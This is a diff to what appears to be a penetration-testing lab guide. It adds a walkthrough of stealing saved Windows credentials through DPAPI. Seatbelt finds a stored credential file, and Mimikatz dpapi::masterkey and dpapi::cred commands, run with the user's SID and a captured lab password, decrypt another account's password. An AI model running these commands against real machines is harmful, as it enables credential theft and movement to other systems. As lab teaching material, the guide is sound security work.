@@ -25,7 +25,7 @@ Add-ADGroupMember "Backup Operators" -Members sa_backup
 
 7\. Click on the "Windows Credentials" tab and select "Add a Windows credential".
 
-![](<../../.gitbook/assets/image (12).png>)
+![](<../../.gitbook/assets/image (12) (1).png>)
 
 8\. Fill in the following information:
 
@@ -39,15 +39,67 @@ Add-ADGroupMember "Backup Operators" -Members sa_backup
 
 ### How it works
 
-
+If a user is logged in or if you have the password of a user you can retrieve its DPAPI masterkey and decrypt the saved credentials on machines. These saved credentials might give you access to other systems
 
 ### Tools
 
-
+* [Seatbelt](https://github.com/GhostPack/Seatbelt)
+* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 
 ### Executing the attack
 
+1. One of the things I like to do when gaining access to a system is running seatbelt. This program will check many things like permissions, groups and for stored credentials. The tool describes itself as:
 
+> Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
+
+2\. To run seatbelt and do some of it checks we can run the following command:
+
+```
+.\Seatbelt.exe -group=user
+```
+
+3\. In the output of the seciont WindowsCredentialFiles we can see that the user sa\_sql has some credentials saved:
+
+![](<../../.gitbook/assets/image (18).png>)
+
+4\. We can find the master encryption key id and some information with the following Mimikatz command using this path:
+
+```
+./mimikatz.exe
+dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD
+```
+
+![](<../../.gitbook/assets/image (12).png>)
+
+The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.
+
+{% hint style="info" %}
+The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostory/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
+{% endhint %}
+
+5\. The next step is to retrieve the masterkey with the password of the user. Luckily we had its password from the time we captured it after doing a UNC path injection through the SQL Service. The password of the `sa_sql` user was `Iloveyou2`.
+
+```
+dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected
+```
+
+![](<../../.gitbook/assets/image (11).png>)
+
+6\. We were able to retrieve the Masterkey, it it shown at almost the end of the output. Now we can read the saved credentials with the masterkey using the following Mimikatz command:
+
+```
+dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2
+```
+
+![](<../../.gitbook/assets/image (2).png>)
+
+First we get the output of the first mimikatz command we ran, some information about the credentials. The output shows is the saved credential for the `sa_backup` user with the password `LS6RV5o8T9`.
+
+7\. With the help of PowerView we can quickly check if this user has any value:
+
+![](<../../.gitbook/assets/image (4).png>)
+
+In PowerView we can see that `sa_backup` is member of the `Account Operators` en `Backup Operators` groups. These groups are interesting!
 
 ## Defending
 
